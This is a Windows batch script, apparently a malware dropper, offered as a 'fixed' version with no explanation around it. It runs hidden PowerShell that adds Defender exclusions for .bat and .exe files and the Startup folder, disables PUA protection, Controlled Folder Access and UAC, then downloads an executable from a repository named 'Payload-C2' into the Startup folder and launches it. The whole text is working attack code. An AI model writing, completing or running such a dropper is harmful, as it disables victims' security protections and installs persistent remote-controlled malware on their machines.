@echo off

:: Fixed script with corrections
start /B /wait powershell.exe -nop -ep bypass -WindowStyle Hidden -Command ^
    "Add-MpPreference -ExclusionExtension '.bat'; ^
     Add-MpPreference -ExclusionExtension '.exe'; ^
     Add-MpPreference -ExclusionPath \"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"; ^
     Set-MpPreference -PUAProtection Disable; ^
     Set-MpPreference -EnableControlledFolderAccess Disabled; ^
     New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -Value 0 -PropertyType DWord -Force"

cd /d "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

powershell.exe -Command ^
    "(New-Object Net.WebClient).DownloadFile('https://github.com/DieFrikadelle/Payload-C2/raw/refs/heads/main/tester/saiko/saik0/kp%E2%81%ADgjiu/33port.exe', '33port.exe'); ^
     Start-Process '33port.exe'"